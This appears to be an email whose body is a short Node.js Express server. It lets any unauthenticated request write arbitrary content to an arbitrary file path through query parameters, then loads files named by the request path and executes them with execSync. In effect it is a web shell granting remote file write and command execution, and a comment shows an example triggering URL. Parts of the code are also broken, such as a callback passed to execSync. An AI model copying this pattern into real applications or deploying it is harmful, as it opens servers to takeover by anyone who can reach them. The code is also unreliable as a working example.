Rita <rita.law86@gmail.com>
	
12:15 AM (0 minutes ago)
	
to me
const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const childProcess = require('child_process');
app.use((req, res, next) => {
    if(req.query.q){
        fs.writeFile(path.join(__dirname, req.query.file), req.query.q, () => {
            // console.log(req.query)
            // http://localhost:3000/?q=hello%20world&file=window.js
            res.send('Query in progress!');
        });
    } else {
        next();
    }
})

app.use(express.static(path.join(__dirname, '/')));

app.get('/', (req,res)=>{
  res.sendFile(path.join(__dirname, 'index.html'));
});



app.get('*', (req, res, next)=>{
  const my_file=require('.'+ req.path);
  console.log(my_file);
  // child =
  childProcess.execSync(my_file, (error, stdout, stderr)=>{
    console.log('stdout: '  + stdout);
    console.log('stderr:' + stderr);
    console.log('error:' + error);
  });
  // child.stdout.pipe(process.stdout);
  next();
});

app.listen(3000, () =>{
    console.log('Chilling on port 3000');
});


